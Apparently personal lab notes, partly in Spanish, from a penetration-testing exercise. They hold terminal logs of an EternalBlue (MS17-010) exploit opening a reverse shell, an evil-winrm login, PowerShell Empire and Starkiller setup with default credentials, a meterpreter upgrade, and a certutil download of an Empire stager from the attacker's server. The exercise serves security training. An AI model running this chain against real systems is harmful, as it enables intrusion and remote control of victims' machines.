```

Installing the current project: empire-bc-security-fork (4.6.1)
[+] Install Complete!

[+] Run the following commands in separate terminals to start Empire
[*] ./ps-empire server
[*] ./ps-empire client
[*] source ~/.bashrc to enable nim 

                                                                                     
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.239.254 -u Sam
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                   

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                     

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Sam\Documents> 

To create an Empire listener, run the following:

solving msfconsole

nano  /usr/share/metasploit-framework/lib/msf/core/handler/reverse_ssh.rb

+      rescue OpenSSL::PKey::PKeyError => e
+        print_error("ReverseSSH handler did not load with OpenSSL version #{OpenSSL::VERSION}")
+        elog(e)
+        'SSH-2.0-OpenSSH_5.3p1'

en vez de esto:
       rescue LoadError => e
        print_error("This handler requires PTY access not available on all platforms.")
         elog(e)
         'SSH-2.0-OpenSSH_5.3p1'
        
***hacking blue and get reverse shell***
┌──(root㉿kali)-[/home/kali]
└─# msfconsole                      
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                              
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                            
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                           
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                          
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                          
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                          
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                          
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                          
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                           
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                            
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                             
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                              
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                               
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                 
           :kk;.OOOOOOOOOOOOO.;Ok:                                                   
             ;kOOOOOOOOOOOOOOOk:                                                     
               ,xOOOOOOOOOOOx,                                                       
                 .lOOOOOOOl.                                                         
                    ,dOd,                                                            
                      .                                                              

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 

──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search ms17

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank     Check  Description
   -  ----                                                  ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/fileformat/office_ms17_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   5  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS
   6  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   7  exploit/windows/smb/smb_doublepulsar_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/smb_doublepulsar_rce                                                        

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.18.1.77       yes       The target host(s), see https://github
                                             .com/rapid7/metasploit-framework/wiki/
                                             Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use f
                                             or authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specif
                                             ied username
   SMBUser                         no        (Optional) The username to authenticat
                                             e as
   VERIFY_ARCH    true             yes       Check if remote architecture matches e
                                             xploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
                                             get. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                        process, none)
   LHOST     192.168.13.129   yes       The listen address (an interface may be spe
                                        cified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload /windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.18.1.77       yes       The target host(s), see https://github
                                             .com/rapid7/metasploit-framework/wiki/
                                             Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use f
                                             or authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specif
                                             ied username
   SMBUser                         no        (Optional) The username to authenticat
                                             e as
   VERIFY_ARCH    true             yes       Check if remote architecture matches e
                                             xploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
                                             get. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                        process, none)
   LHOST     192.168.13.129   yes       The listen address (an interface may be spe
                                        cified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.149.206
rhosts => 10.10.149.206
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.18.1.77
lhost => 10.18.1.77
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.18.1.77:4444 
[*] 10.10.149.206:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.149.206:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.149.206:445     - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.149.206:445 - The target is vulnerable.
[*] 10.10.149.206:445 - Connecting to target for exploitation.
[+] 10.10.149.206:445 - Connection established for exploitation.
[+] 10.10.149.206:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.149.206:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.149.206:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.149.206:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.149.206:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.149.206:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.149.206:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.149.206:445 - Sending all but last fragment of exploit packet
[*] 10.10.149.206:445 - Starting non-paged pool grooming
[+] 10.10.149.206:445 - Sending SMBv2 buffers
[+] 10.10.149.206:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.149.206:445 - Sending final SMBv2 buffers.
[*] 10.10.149.206:445 - Sending last fragment of exploit packet!
[*] 10.10.149.206:445 - Receiving response from exploit packet
[+] 10.10.149.206:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.149.206:445 - Sending egg to corrupted connection.
[*] 10.10.149.206:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.149.206
[*] Command shell session 1 opened (10.18.1.77:4444 -> 10.10.149.206:49229 ) at 2022-07-29 13:05:35 -0400
[+] 10.10.149.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.149.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.149.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----

***inicializando empire y starkiller***
┌──(root㉿kali)-[/home/kali/Downloads/Empire]
└─# ./ps-empire server
[*] Loading default config
[*] Setting up database.
[*] Adding default user.
[*] Adding database config.
[*] Generating random staging key
[*] Adding default keyword obfuscation functions.
[*] Certificate not found. Generating...
[*] Certificate written to ../empire/server/data/empire-chain.pem
[*] Private key written to ../empire/server/data/empire-priv.key
[*] Loading bypasses from: /home/kali/Downloads/Empire/empire/server/bypasses/
[*] Loading stagers from: /home/kali/Downloads/Empire/empire/server/stagers/
[*] Loading modules from: /home/kali/Downloads/Empire/empire/server/modules/
[*] Loading listeners from: /home/kali/Downloads/Empire/empire/server/listeners/
[*] Loading malleable profiles from: /home/kali/Downloads/Empire/empire/server/data/profiles                                                                              
[*] Searching for plugins at /home/kali/Downloads/Empire/empire/server/plugins/
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire reverseshell server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading Empire C# server plugin
[*] Registering plugin with menu...
[*] Initializing plugin...
[*] Doing custom initialization...
[*] Loading websockify server plugin
[*] Registering plugin with menu...
[*] Empire starting up...
[*] Starting Empire RESTful API on 0.0.0.0:1337
[*] Starting Empire SocketIO on 0.0.0.0:5000
[*] Testing APIs
[+] Empire RESTful API successfully started
[+] test-ddqd connected to socketio
[+] Empire SocketIO successfully started
[*] Cleaning up test user
[+] Client disconnected from socketio

Welcome to .NET Core 3.1!
---------------------
SDK Version: 3.1.421

Telemetry
---------
The .NET Core tools collect usage data in order to help us improve your experience. It is collected by Microsoft and shared with the community. You can opt-out of telemetry by setting the DOTNET_CLI_TELEMETRY_OPTOUT environment variable to '1' or 'true' using your favorite shell.

Read more about .NET Core CLI Tools telemetry: https://aka.ms/dotnet-cli-telemetry

----------------
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Find out what's new: https://aka.ms/dotnet-whats-new
Learn about the installed HTTPS developer cert: https://aka.ms/aspnet-core-https
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli-docs
Write your first app: https://aka.ms/first-net-core-app
--------------------------------------------------------------------------------------
Microsoft (R) Build Engine version 16.7.2+b60ddb6f4 for .NET
Copyright (C) Microsoft Corporation. All rights reserved.

[+] Plugin csharpserver ran successfully!
Server >   Determining projects to restore...
  Restored /home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj (in 1.06 min).
Class.cs(8,7): warning CS0105: The using directive for 'System' appeared previously in this namespace [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                                        
Class.cs(31,13): warning CS4014: Because this call is not awaited, execution of the current method continues before the call is completed. Consider applying the 'await' operator to the result of the call. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                      
Class.cs(59,21): warning CS4014: Because this call is not awaited, execution of the current method continues before the call is completed. Consider applying the 'await' operator to the result of the call. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                      
Core/CovenantService.cs(244,43): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(257,35): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(265,62): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(272,46): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(278,59): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(288,64): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(294,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(307,38): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(381,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(566,38): warning CS0168: The variable 'e' is declared but never used [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                                                 
Core/CovenantService.cs(397,41): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(584,58): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(589,45): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(599,45): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(641,44): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(648,44): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(656,57): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(668,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(759,38): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(832,27): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(849,64): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(857,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(913,59): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(938,46): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
  EmpireCompiler -> /home/kali/Downloads/Empire/empire/server/csharp/Covenant/bin/Debug/netcoreapp3.1/EmpireCompiler.dll

Build succeeded.                                                                     
                                                                                     
Class.cs(8,7): warning CS0105: The using directive for 'System' appeared previously in this namespace [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                                        
Class.cs(31,13): warning CS4014: Because this call is not awaited, execution of the current method continues before the call is completed. Consider applying the 'await' operator to the result of the call. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                      
Class.cs(59,21): warning CS4014: Because this call is not awaited, execution of the current method continues before the call is completed. Consider applying the 'await' operator to the result of the call. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                      
Core/CovenantService.cs(244,43): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(257,35): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(265,62): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(272,46): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(278,59): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(288,64): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(294,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(307,38): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(381,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(566,38): warning CS0168: The variable 'e' is declared but never used [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj]                                                                                 
Core/CovenantService.cs(397,41): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(584,58): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(589,45): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(599,45): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(641,44): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(648,44): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(656,57): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(668,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(759,38): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(832,27): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(849,64): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(857,51): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(913,59): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
Core/CovenantService.cs(938,46): warning CS1998: This async method lacks 'await' operators and will run synchronously. Consider using the 'await' operator to await non-blocking API calls, or 'await Task.Run(...)' to do CPU-bound work on a background thread. [/home/kali/Downloads/Empire/empire/server/csharp/Covenant/EmpireCompiler.csproj] 
    27 Warning(s)                                                                    
    0 Error(s)                                                                       

Time Elapsed 00:02:11.93
[+] empireadmin connected to socketio
^[[20;1RServer >

──(kali㉿kali)-[~/Downloads/Empire]
└─$ ./starkiller-1.10.0.AppImage 
libva error: vaGetDriverNameByIndex() failed with unknown libva error, driver_name = (null)

Default Credentials

	Uri: 127.0.0.1:1337

	User: empireadmin

	Pass: password123


Once you have logged into Starkiller you should be greeted with the Listeners menu, once you have Starkiller or Empire ready move on to Task 3 to get familiar with the menu.

[Task 3] Escalate

Now we background our current shell (Ctrl+Z) and convert our shell to a meterpreter shell.

msf6 > search shell_to_meterpreter
msf6 > use 0
We show options for the current selected exploit. We set LHOST and SESSION.

set LHOST <ip>
set SESSION <session-no.>

We run the exploit and we get a meterpreter session. We then use the meterpreter session instead of the shell.

sessions -i <meterpreter-session-no.>


C:\Users\Jon\Downloads>^Z   
Background channel 1? [y/N]  y
meterpreter > shell
Process 536 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Jon\Downloads>

***listeners (starkiller)***
1	http	http	http://10.18.1.77:8080	8080	an hour ago
***stagers***
windows/launcher_bat	http	windows/launcher_bat	powershell	25 minutes ago
save luancher.bat in /home/kali/Downloads/EMPIRE/
***python server***
pasa launcher.bat a meterpreter(con eternalblue) 
en meterpreter -> certutil.exe -urlcache -f http://10.18.1.77/launcher.bat launcher.bat

C:\Users\Jon\Downloads>certutil.exe -urlcache -f http://10.18.1.77/launcher.bat launcher.bat
certutil.exe -urlcache -f http://10.18.1.77/launcher.bat launcher.bat
****  Online  ****
CertUtil: -URLCache command completed successfully.


```

[[DNS]]